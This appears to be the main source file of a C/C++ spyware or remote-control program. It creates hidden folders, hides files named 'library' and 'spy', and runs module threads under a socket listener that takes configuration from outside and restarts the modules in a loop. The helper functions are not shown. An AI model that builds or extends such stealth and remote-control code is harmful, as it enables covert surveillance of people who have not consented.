#include "Headers.h"
#include "Commonfunctional.h"
#include "InitControl.h"
#include "ThreadStart.h"
#include "ThreadSocket.h"
#include "Singlemodulesrun.h"
#include "ControlCopy.h"

void main(void)
{
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	control *B = new control, C, X;
	ofstream out;
	pthread_t ModuleStarter, ListenSocket;

	CreateHiddenFolders();
	HideFile(library);
	HideFile(spy);

	InitControl(C);
	Copy(X, C);

	OutTextWithTime(logpath, "Threads were started in ", &C, out);

	do {
	
		pthread_create(&ModuleStarter, NULL, Start, (void*)&X);
		pthread_join(ModuleStarter, NULL);
		pthread_create(&ListenSocket, NULL, ListenSocketProc, (void*)&C);
		pthread_join(ListenSocket, (void**)&B);

		if (B == NULL)
		{
			OutTextWithTime(logpath, "Configuration file Config.ksb is not found or corrupted! Using last successfull configuration! Time: ", &C, out);
			B = new control;
			do {

				pthread_create(&ListenSocket, NULL, ListenSocketProc, (void*)&C);
				pthread_join(ListenSocket, (void**)&B);

			} while (B == NULL);
		}

		Copy(C, B);
		Copy(X, C);

		KillModules(&X);
		OutTextWithTime(logpath, "Threads were restarted in ", &C, out);

	} while (C.stop != true);

	OutTextWithTime(logpath, "Threads were stopped in ", NULL, out);
}